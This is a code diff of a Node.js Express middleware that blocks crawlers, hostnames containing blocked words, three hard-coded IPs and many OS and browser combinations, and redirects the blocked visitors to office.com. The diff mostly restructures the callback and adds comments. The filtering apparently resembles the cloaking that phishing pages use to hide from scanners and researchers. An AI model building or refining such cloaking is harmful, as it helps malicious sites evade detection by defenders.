@@ -73,11 +73,13 @@ const detectBotMiddleware = (req, res, next) => {
 
     console.log(`Detected IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
 
+    // Check if the user agent belongs to a crawler
     if (isCrawler(userAgent)) {
         console.log(`Blocked crawler: User-Agent: ${userAgent}, IP: ${ip}`);
         return res.status(403).send('Crawlers are not allowed');
     }
-    
+
+    // Resolve hostname and check for blocked words
     dns.reverse(ip, (err, hostnames) => {
         if (err) {
             console.error('Error resolving hostname:', err);
@@ -93,27 +95,28 @@ const detectBotMiddleware = (req, res, next) => {
             console.log(`Blocked request from hostname: ${hostnames.join(', ')}`);
             return res.status(404).send('Not found');
         }
-    
-    // Your blocking logic
-    if (
-        ip === "92.23.57.168" ||
-        ip === "96.31.1.4" ||
-        ip === "207.96.148.8" ||
-        (os === "Windows Server 2003/XP x64" && browser === "Firefox") ||
-        (os === "Windows 7" && browser === "Firefox") ||
-        (os === "Windows XP" && ["Firefox", "Internet Explorer", "Chrome"].includes(browser)) ||
-        (os === "Windows Vista" && browser === "Internet Explorer") ||
-        ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"].includes(os) ||
-        browser === "Internet Explorer" ||
-        os === "Windows 2000" ||
-        os === "Unknown OS Platform" ||
-        browser === "Unknown Browser"
-    ){
-        console.log(`Blocked request: IP: ${ip}, OS: ${os}, Browser: ${browser}`);
-        return res.redirect("https://office.com");
-    }
 
-    next();
+        // Block specific IP, OS, and browser combinations
+        if (
+            ip === "92.23.57.168" ||
+            ip === "96.31.1.4" ||
+            ip === "207.96.148.8" ||
+            (os === "Windows Server 2003/XP x64" && browser === "Firefox") ||
+            (os === "Windows 7" && browser === "Firefox") ||
+            (os === "Windows XP" && ["Firefox", "Internet Explorer", "Chrome"].includes(browser)) ||
+            (os === "Windows Vista" && browser === "Internet Explorer") ||
+            ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"].includes(os) ||
+            browser === "Internet Explorer" ||
+            os === "Windows 2000" ||
+            os === "Unknown OS Platform" ||
+            browser === "Unknown Browser"
+        ) {
+            console.log(`Blocked request: IP: ${ip}, OS: ${os}, Browser: ${browser}`);
+            return res.redirect("https://office.com");
+        }
+
+        next(); // Move to the next middleware if no conditions are met
+    });
 };
 
 // Apply Bot Detection Middleware
